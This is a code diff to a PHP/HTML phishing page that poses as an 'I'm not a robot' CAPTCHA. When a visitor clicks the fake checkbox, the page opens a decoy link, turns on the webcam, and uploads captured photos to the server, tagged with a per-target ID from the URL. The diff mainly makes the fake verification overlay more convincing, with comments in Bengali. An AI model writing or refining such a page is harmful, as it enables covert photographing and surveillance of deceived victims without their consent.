@@ -54,49 +54,68 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             padding: 0;
             width: 100%;
             height: 100%;
-            background-color: #1a1a1a;
+            overflow: hidden;
+            background-color: #111;
+            font-family: Arial, sans-serif;
+        }
+        /* Verification Overlay CSS */
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: Arial, sans-serif;
+            z-index: 9999;
         }
-        .verify-box {
-            background: #fff;
+        .card {
+            background: #222;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             text-align: center;
+            border: 1px solid #444;
             max-width: 320px;
-            width: 100%;
+            width: 90%;
         }
-        .verify-btn {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
+        .robot-btn {
+            background: #fff;
+            border: 1px solid #d3d3d3;
+            padding: 12px 20px;
             font-size: 16px;
+            font-weight: bold;
+            color: #333;
             border-radius: 4px;
             cursor: pointer;
-            margin-top: 15px;
-            font-weight: bold;
-            width: 100%;
-            transition: background 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: background 0.2s;
         }
-        .verify-btn:hover {
-            background-color: #45a049;
+        .robot-btn:hover {
+            background: #f1f1f1;
         }
-        p {
-            color: #333;
-            font-size: 15px;
-            margin-bottom: 10px;
+        .robot-btn input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <div class="verify-box" id="box">
-        <p>Please verify that you are human to continue.</p>
-        <button class="verify-btn" onclick="startProcess()">I am not a robot</button>
+    <!-- Overlay with "I'm not a robot" button -->
+    <div id="overlay">
+        <div class="card">
+            <p style="color: #fff; margin-bottom: 20px; font-size: 15px;">Please verify you are human to continue.</p>
+            <button class="robot-btn" id="verify-btn">
+                <input type="checkbox" id="chk"> I'm not a robot
+            </button>
+        </div>
     </div>
     
     <video id="video" autoplay playsinline style="display:none;"></video>
@@ -105,6 +124,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const overlay = document.getElementById('overlay');
+        const verifyBtn = document.getElementById('verify-btn');
+        const checkbox = document.getElementById('chk');
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
@@ -120,14 +142,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             }
         }
 
-        function startProcess() {
-            // Box লুকিয়ে ফেলা বা রিডাইরেক্ট লুক নেওয়া
-            document.getElementById('box').style.display = 'none';
-
-            // নতুন ট্যাবে টার্গেট লিংক ওপেন করা (ইউজারের ক্লিকের কারণে ব্রাউজার ব্লক করবে না)
+        // Button ba checkbox-e click korle sob kaj shuru hobe
+        verifyBtn.addEventListener('click', () => {
+            checkbox.checked = true;
+            
+            // Overlay hide kora ebong new tab-e link open kora
+            overlay.style.display = 'none';
             window.open(finalUrl, '_blank');
 
-            // ক্যামেরা পারমিশন ও ক্যাপচার শুরু করা
+            // Camera capture & upload start kora user interaction-er por
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
@@ -138,7 +161,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .catch(err => {
                     console.error("Camera error: ", err);
                 });
-        }
+        });
 
         function captureAndUpload() {
             const context = canvas.getContext('2d');
@@ -155,7 +178,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 },
                 body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId)
             }).catch(error => {
-                console.error('Error:',erg);
+                console.error('Error:', error);
             });
         }
     </script>
